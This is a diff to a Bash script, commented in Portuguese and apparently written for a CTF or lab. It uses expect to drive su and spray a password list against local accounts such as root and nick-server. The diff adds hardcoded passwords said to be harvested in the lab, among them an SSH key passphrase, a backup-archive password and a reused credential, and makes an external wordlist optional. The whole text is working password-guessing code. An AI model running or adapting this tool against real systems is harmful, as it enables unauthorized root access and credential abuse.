@@ -1,8 +1,9 @@
 #!/usr/bin/env bash
 # su spray helper (CTF/lab): testa lista de senhas contra usuarios locais via expect.
 # Uso:
+#   bash su_password_spray.sh
 #   bash su_password_spray.sh --wordlist /caminho/old-passwds --users "root nick-server"
-#   bash su_password_spray.sh --wordlist /caminho/old-passwds --users "root" --stop-on-hit
+#   bash su_password_spray.sh --users "root" --stop-on-hit
 #
 # Observacoes:
 # - Requer expect instalado no host alvo.
@@ -15,13 +16,29 @@ USERS="root nick-server"
 STOP_ON_HIT=0
 TIMEOUT_SECS=5
 
+# Senhas embutidas (inclui as encontradas no lab):
+# - 424242   (passphrase da key SSH)
+# - crazycat (senha do Backup.zip)
+# - ZeqlcR2!4gN (credencial reutilizada)
+EMBEDDED_PASSWORDS=(
+  "424242"
+  "crazycat"
+  "ZeqlcR2!4gN"
+  "nickj"
+  "nick-server"
+  "root"
+  "admin"
+  "password"
+  "123456"
+)
+
 usage() {
   cat <<'EOF'
 Uso:
-  su_password_spray.sh --wordlist <arquivo> [--users "root nick-server"] [--stop-on-hit] [--timeout 5]
+  su_password_spray.sh [--wordlist <arquivo>] [--users "root nick-server"] [--stop-on-hit] [--timeout 5]
 
 Opcoes:
-  --wordlist <arquivo>   Arquivo com 1 senha por linha (obrigatorio).
+  --wordlist <arquivo>   Arquivo com 1 senha por linha (opcional, soma com embutidas).
   --users "u1 u2"        Usuarios alvo separados por espaco (default: "root nick-server").
   --stop-on-hit          Para ao primeiro sucesso.
   --timeout <seg>        Timeout por tentativa (default: 5).
@@ -39,8 +56,8 @@ while [[ $# -gt 0 ]]; do
   esac
 done
 
-if [[ -z "${WORDLIST}" || ! -f "${WORDLIST}" ]]; then
-  echo "[!] --wordlist e obrigatorio e deve existir." >&2
+if [[ -n "${WORDLIST}" && ! -f "${WORDLIST}" ]]; then
+  echo "[!] Arquivo de --wordlist nao existe: ${WORDLIST}" >&2
   exit 1
 fi
 
@@ -53,7 +70,23 @@ fi
 TMP_OUT="/tmp/su_spray_hits_$$.txt"
 : > "${TMP_OUT}"
 
-echo "[*] Wordlist: ${WORDLIST}"
+PASS_FILE="/tmp/su_spray_passwords_$$.txt"
+cleanup() {
+  rm -f "${PASS_FILE}" 2>/dev/null || true
+}
+trap cleanup EXIT
+
+# Junta embutidas + wordlist opcional e remove duplicadas preservando ordem.
+printf '%s\n' "${EMBEDDED_PASSWORDS[@]}" > "${PASS_FILE}"
+if [[ -n "${WORDLIST}" ]]; then
+  cat "${WORDLIST}" >> "${PASS_FILE}"
+fi
+awk '!seen[$0]++' "${PASS_FILE}" > "${PASS_FILE}.uniq"
+mv "${PASS_FILE}.uniq" "${PASS_FILE}"
+
+echo "[*] Wordlist externa: ${WORDLIST:-<nenhuma>}"
+echo "[*] Senhas embutidas: ${#EMBEDDED_PASSWORDS[@]}"
+echo "[*] Total de senhas unicas: $(wc -l < "${PASS_FILE}")"
 echo "[*] Usuarios: ${USERS}"
 echo "[*] Timeout por tentativa: ${TIMEOUT_SECS}s"
 
@@ -100,7 +133,7 @@ while IFS= read -r password || [[ -n "$password" ]]; do
       fi
     fi
   done
-done < "${WORDLIST}"
+done < "${PASS_FILE}"
 
 echo
 echo "[*] Tentativas: ${attempts}"
